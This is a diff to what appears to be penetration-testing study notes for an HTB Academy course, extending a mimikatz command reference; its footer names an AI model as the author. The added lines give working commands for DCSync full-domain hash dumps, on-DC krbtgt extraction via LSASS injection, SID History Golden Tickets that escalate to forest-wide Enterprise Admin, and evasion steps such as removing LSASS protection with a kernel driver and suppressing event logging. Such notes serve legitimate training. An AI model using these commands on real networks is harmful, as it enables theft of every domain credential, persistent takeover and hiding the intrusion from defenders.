@@ -20,8 +20,9 @@ mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsa
 
 > [!warning] **Requires admin/SYSTEM** — Most modules require local admin at minimum. `lsadump::dcsync` requires Domain Admin or replication rights. `token::elevate` escalates from admin to SYSTEM context (needed for SAM/LSA dumps).
 
-> [!note] **See also** — [[Services/Active Directory/Entra ID|Entra ID]] PRT Abuse section (`sekurlsa::cloudap`) and Azure AD Connect Attacks section (on-prem DCSync); [[Services/Active Directory/Kerberos|Kerberos]], for ticket export/import, Golden/Silver Ticket forging, and the Skeleton Key persistence technique. Also [[Class notes/HTB Academy/CPTS v2 (claude)/Windows Priv Esc|Windows Priv Esc]] (CPTS v2) — LSASS/SAM/LSA dumping and token elevation post-privesc.
+> [!note] **See also** — [[Services/Active Directory/Entra ID|Entra ID]] PRT Abuse section (`sekurlsa::cloudap`) and Azure AD Connect Attacks section (on-prem DCSync); [[Services/Active Directory/Kerberos|Kerberos]], for ticket export/import, Golden/Silver Ticket forging, and the Skeleton Key persistence technique. Also [[Class notes/HTB Academy/CPTS v2 (claude)/Windows Priv Esc|Windows Priv Esc]] (CPTS v2) — LSASS/SAM/LSA dumping and token elevation post-privesc. For the same DCSync/SAM/LSA extraction *from your attack box* (no binary on target) see [[Tools/Credential Dumping/secretsdump|secretsdump]].
 > Also used in [[Class notes/HTB Academy/CPTS v2 (claude)/Password Attacks|Password Attacks]] (CPTS v2).
+> **Companion note:** [[Tools/Auth/mimikatz|mimikatz (Auth angle)]] — the auth/pillaging-focused cut, covering `lsadump::trust /patch` (trust keys for inter-realm TGTs), `crypto::certificates /export`, and `dpapi::cred` for cached VPN/ZPA session blobs. This note is the full credential-dumping command reference; that one is the auth/secrets-pillaging view.
 
 ---
 
@@ -140,6 +141,10 @@ lsadump::dcsync /domain:inlanefreight.htb /user:krbtgt
 :: Dump all domain hashes (slow — every account)
 lsadump::dcsync /domain:inlanefreight.htb /all
 
+:: Mass dump straight to CSV (RID, user, NTLM, pwd-last-set) — the sane format
+:: for a full-domain pull; pipe/redirect the console to a file
+lsadump::dcsync /domain:inlanefreight.htb /all /csv
+
 :: Target a specific DC
 lsadump::dcsync /domain:inlanefreight.htb /user:krbtgt /dc:DC01.inlanefreight.htb
 
@@ -149,6 +154,18 @@ lsadump::dcsync /domain:inlanefreight.htb /user:Administrator
 ```
 
 > [!note] **krbtgt hash** — Always dump the `krbtgt` account hash. It's used to forge Golden Tickets and is the most valuable single credential in a domain. Two consecutive resets are required to invalidate it.
+
+**On-DC alternative — `lsadump::lsa /inject`:** DCSync uses the replication protocol (MS-DRSR) over the wire and needs replication rights. When you're already running as SYSTEM *on a DC*, `lsadump::lsa /inject` reads the AD database by injecting into LSASS locally instead — no replication rights, no DRSUAPI traffic (different detection surface than dcsync).
+```cmd
+:: On the DC, as SYSTEM — pull one account
+privilege::debug
+token::elevate
+lsadump::lsa /inject /name:krbtgt
+
+:: /patch is the older/lighter variant (patches Samss) but returns only NTLM,
+:: no full key material — prefer /inject
+lsadump::lsa /patch
+```
 
 ---
 
@@ -255,6 +272,13 @@ kerberos::golden /domain:inlanefreight.htb /sid:S-1-5-21-3842939050-3880317879-2
 :: /startoffset:-10             — ticket start time (-10 min skew)
 :: /endin:600                   — ticket lifetime in minutes (default: 10 hours)
 :: /renewmax:10080              — max renewal in minutes (default: 7 days)
+:: /sids:S-1-5-21-<ROOT>-519    — SID History injection: stamp extra SIDs into
+::                                the ticket. Point at the ROOT domain's Enterprise
+::                                Admins (519) to escalate a child-domain Golden
+::                                Ticket to forest-wide (classic child→parent).
+
+:: Forest escalation — child domain krbtgt + root Enterprise Admins SID via SID History
+kerberos::golden /domain:child.inlanefreight.htb /sid:S-1-5-21-<CHILD> /rc4:<child_krbtgt> /user:hacker /sids:S-1-5-21-<ROOT>-519 /ptt
 ```
 
 ---
@@ -436,7 +460,8 @@ meterpreter> golden_ticket_create   :: Golden Ticket
 | `sekurlsa` | `sekurlsa::minidump` | Load offline LSASS dump |
 | `lsadump` | `lsadump::sam` | Dump local SAM hashes |
 | `lsadump` | `lsadump::secrets` | Dump LSA secrets |
-| `lsadump` | `lsadump::dcsync` | DCSync (remote NTDS dump) |
+| `lsadump` | `lsadump::dcsync` | DCSync (remote NTDS dump; `/all /csv` for full domain) |
+| `lsadump` | `lsadump::lsa /inject` | On-DC AD dump via LSASS injection (no replication rights) |
 | `kerberos` | `kerberos::ptt` | Pass the Ticket (inject) |
 | `kerberos` | `kerberos::list` | List tickets in memory |
 | `kerberos` | `kerberos::golden` | Forge Golden/Silver ticket |
@@ -452,7 +477,7 @@ meterpreter> golden_ticket_create   :: Golden Ticket
 ## OPSEC Notes
 
 - **AV/EDR** — mimikatz.exe is heavily signatured. Use Invoke-Mimikatz (in-memory), execute-assembly, or obfuscated variants. LSASS dump + offline parsing is stealthier.
-- **PPL (Protected Process Light)** — Windows 8.1+ can mark LSASS as PPL, blocking standard reads. Bypass: `!+` (mimidrv.sys kernel driver) or use a vulnerable driver (BYOVD). Alternatively dump via comsvcs.dll.
+- **PPL (Protected Process Light)** — Windows 8.1+ can mark LSASS as PPL, blocking standard reads. Bypass with mimikatz's own signed kernel driver: `!+` loads `mimidrv.sys`, then `!processprotect /process:lsass.exe /remove` strips the protection flag so `sekurlsa::logonpasswords` works normally; re-add with `!processprotect /process:lsass.exe`. (Driver-load itself is loud and needs the driver to load on modern signing-enforced hosts.) Alternatives: BYOVD with a vulnerable third-party driver, or just dump via comsvcs.dll and parse the `.dmp` offline (PPL doesn't stop a MiniDump written by a SYSTEM LOLBin).
 - **Credential Guard** — Isolates LSASS in a VSM (Virtualization Security Module). `sekurlsa::logonpasswords` returns no plaintext credentials. Only Kerberos tickets can be extracted. DCSync still works if you have rights.
 - **ETW / Event 4624, 4625, 4672** — SeDebugPrivilege grant and LSASS reads generate events. `event::drop` can suppress further logging on the current host.
 - **Use AES256** — When forging tickets or doing OverPass-the-Hash, use AES256 keys where possible. RC4 (NTLM) usage is an anomaly detection indicator in modern environments.
@@ -460,5 +485,5 @@ meterpreter> golden_ticket_create   :: Golden Ticket
 ---
 
 *Created: 2026-03-06*
-*Updated: 2026-08-18*
-*Model: claude-opus-5*
+*Updated: 2026-09-29*
+*Model: claude-opus-4-8*
